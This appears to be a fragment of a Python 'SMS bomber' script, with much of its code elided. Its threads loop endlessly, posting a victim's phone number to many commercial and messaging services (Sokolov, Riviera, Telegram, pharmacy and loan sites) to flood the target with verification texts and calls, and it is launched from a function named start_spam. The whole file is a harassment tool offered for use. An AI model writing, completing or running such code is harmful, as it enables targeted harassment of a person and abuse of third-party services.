...
from main1 import sunlight_call, parfum_call, dns_call, finish_driver
import threading
...
def sms_two():
    ...
    global lst
    while Flag:  
        if int(monotonic()-time_sms_two) >= 15:
            try:
                ...
                print("Data 122: ", ex) # telegram
                lst.append("Data 122 (Berkat)")
            ...
            try:
                ...
                print("Data 1223 (InfoEr): ", ex)
                lst.append("Data 122 (InfoEr)")
            ...
            try:
                ...
                print("Data 10 (Telegram): ", ex) # telegram
                lst.append("Data 10 (Telegram)")
            ...
            try:
                ...
                print("Data 13 (Pharmperm): ", ex) 
                lst.append("Data 13 (Pharmperm)")
            sleep(0.01)
            try:
                requests.post(link14, headers=headers_sokolov, data=data14)
            except Exception as ex:
                print("Data 14 (Sokolov): ", ex) 
                lst.append("Data 14 (Sokolov)")
            sleep(0.01)
            ...
            try:
                ...
                print("Data 16 (Lunaro): ", ex)
                lst.append("Data 16 (Lunaro)")
            sleep(0.01)
            try:
                requests.post(link17,  headers=headers_riviera , data=data17)
            except Exception as ex:
                print("Data 17 (riviera): ", ex) 
                lst.append("Data 17 (Triviera)")
            sleep(0.01)
            try:
            ...
            try:
                ...
                print("Data 18 (evrassia): ", ex) 
                lst.append("Data 18 (evrassia)")
            sleep(0.01)
            ...
            try:
                ...
                print("Data 20 (nadodeneg): ", ex) # nadodeneg
                lst.append("Data 20 (Nadodeneg)")
            time_sms_two = monotonic()
            sleep(0.01)
...
def call_one():
    link1, link2,  link4, link5, link6, link7, link8,  link10,  link12, link13, link14, link15, link16, link17, link18, link19, link20, link21,  data1, data2,  data4, data5, data6, data7, data8,  data10 ,  data13, data14, data15, data16, data17, json_data111, data18, data19, number_call, data20, data1223, data21 = data_links(number)
    time_dns = monotonic()
    time_sunlight = monotonic()
    time_parfum = monotonic()
    while Flag:
        try:
            if int(monotonic()-time_dns) >= 10:
                dns_call(number_call)
                time_dns = monotonic()
        except: ...
        ...
        try:
            if int(monotonic()-time_sunlight) >= 5:
                sunlight_call(number_call)
                time_sunlight = monotonic()
        except: ...
        ...
        try:
            if int(monotonic()-time_parfum) >= 15:
                parfum_call(number_call)
                time_parfum = monotonic()
        except: ...
...
def start_spam(message):
    ...
    threading.Thread(target=call_one).start()
